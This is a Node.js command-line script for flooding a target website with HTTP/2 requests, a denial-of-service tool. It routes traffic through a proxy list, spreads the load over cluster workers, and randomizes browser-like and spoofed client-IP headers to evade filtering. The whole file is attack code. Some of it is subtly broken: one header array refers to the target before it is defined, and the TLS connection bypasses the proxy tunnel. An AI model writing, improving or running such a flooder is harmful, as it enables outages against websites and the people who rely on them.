const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function () {});

if (process.argv.length < 7) {
    console.log(`Usage: target time rate thread proxyfile`);
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];

const accept_header = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'application/json, text/plain, */*',
    'application/xml, text/xml',
    'text/css,*/*;q=0.1',
    'application/javascript, */*;q=0.8',
    'image/jpeg,image/png,image/*;q=0.8,*/*;q=0.5'
];

const lang_header = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'zh-CN,zh;q=0.9',
    'zh-TW,zh;q=0.8',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.8',
    'ja-JP,ja;q=0.9',
    'es-ES,es;q=0.8',
    'ko-KR,ko;q=0.9',
    'ar-SA,ar;q=0.8'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br',
    'compress, gzip',
    'deflate, br',
    'identity'
];

const version = [
    '"Google Chrome";v="117", "Chromium";v="117", ";Not A Brand";v="99"',
    '"Google Chrome";v="115", "Chromium";v="115", ";Not A Brand";v="99"',
    '"Microsoft Edge";v="117", "Chromium";v="117", ";Not A Brand";v="99"',
    '"Firefox";v="118", ";Not A Brand";v="99"',
    '"Safari";v="16.6", "Chrome";v="117.0.5938.149", ";Not A Brand";v="99"',
    '"Opera";v="101", "Chrome";v="117.0.5938.132", ";Not A Brand";v="99"'
];

const rateHeaders = [
    { "akamai-origin-hop": randstr(15) },
    { "x-forwarded-for": randstr(15) },
    { "x-real-ip": randstr(15) },
    { "via": randstr(15) },
    { "client-ip": randstr(15) },
    { "user-agent": randstr(15) },
    { "referer": `https://${parsedTarget.host}/${randstr(10)}` }
];

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
} else {
    for (let i = 0; i < 5; i++) {
        setInterval(runFlooder, 500);
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = Buffer.from(`CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true,
        });

        connection.setTimeout(options.timeout * 5000);
        connection.setKeepAlive(true, 10000);

        connection.on("connect", () => {
            connection.write(payload);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: connection");
        });
    }
}

const Socker = new NetSocket();

headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(12) + "=" + randstr(8);
headers[":scheme"] = "https";
headers["sec-ch-ua"] = randomElement(version);
headers["sec-ch-ua-platform"] = randomElement(["Windows", "Linux", "macOS"]);
headers["sec-ch-ua-mobile"] = "?0";
headers["accept-encoding"] = randomElement(encoding_header);
headers["accept-language"] = randomElement(lang_header);
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = randomElement(accept_header);
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-site"] = "same-origin";
headers["sec-fetch-user"] = "?1";
headers["x-requested-with"] = "XMLHttpRequest";

function runFlooder() {
    const proxies = readLines(args.proxyFile);
    for (let i = 0; i < 3; i++) {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");

        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 10,
        };

        function attemptFlood() {
            Socker.HTTP(proxyOptions, (connection, error) => {
                if (error) {
                    setTimeout(attemptFlood, 500);
                    return;
                }

                const tlsOptions = {
                    secure: true,
                    ALPNProtocols: ['h2'],
                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
                    ecdhCurve: 'auto',
                    host: parsedTarget.host,
                    servername: parsedTarget.host,
                    rejectUnauthorized: false,
                    secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                        crypto.constants.SSL_OP_NO_TICKET |
                        crypto.constants.SSL_OP_NO_COMPRESSION |
                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                        crypto.constants.SSL_OP_NO_RENEGOTIATION
                };

                const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
                tlsConn.setKeepAlive(true, 30000);

                const client = http2.connect(parsedTarget.href, {
                    protocol: "https:",
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 2000,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 65536,
                        enablePush: false
                    },
                    createConnection: () => tlsConn,
                });

                client.on("connect", () => {
                    const IntervalAttack = setInterval(() => {
                        const dynHeaders = {
                            ...headers,
                            ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
                        };
                        for (let i = 0; i < args.Rate * 2; i++) {
                            const request = client.request(dynHeaders);
                            request.on("response", () => {
                                request.close();
                                request.destroy();
                            });
                            request.on("error", () => {
                                request.close();
                                request.destroy();
                            });
                            request.end();
                        }
                    }, 200);
                });

                client.on("error", () => {
                    client.destroy();
                    setTimeout(attemptFlood, 500);
                });

                client.on("close", () => {
                    client.destroy();
                    setTimeout(attemptFlood, 500);
                });
            });
        }

        attemptFlood();
    }
}

setTimeout(() => process.exit(1), args.time * 1000);
